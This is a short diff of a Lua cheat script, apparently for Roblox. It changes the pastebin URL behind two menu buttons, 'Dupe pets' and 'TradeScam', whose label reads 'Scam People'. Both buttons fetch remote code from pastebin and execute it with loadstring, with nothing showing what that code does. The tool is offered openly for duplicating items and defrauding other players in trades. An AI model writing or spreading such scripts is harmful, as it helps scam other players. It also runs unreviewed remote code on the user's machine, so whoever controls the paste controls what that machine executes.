@@ -7,7 +7,7 @@ local DupeSection = Dupe:NewSection("Dupe")
 
 
 DupeSection:NewButton("Dupe pets", "Dupes all your pets", function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/JgyjdR6y"))()
+    loadstring(game:HttpGet("https://pastebin.com/raw/DaR9vap7"))()
 end)
 
 --Trade Scam
@@ -16,5 +16,5 @@ local TradeScamSection = TradeScam:NewSection("TradeScam")
 
 
 TradeScamSection:NewButton("TradeScam", "Scam People", function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/JgyjdR6y"))()
+    loadstring(game:HttpGet("https://pastebin.com/raw/DaR9vap7"))()
 end)
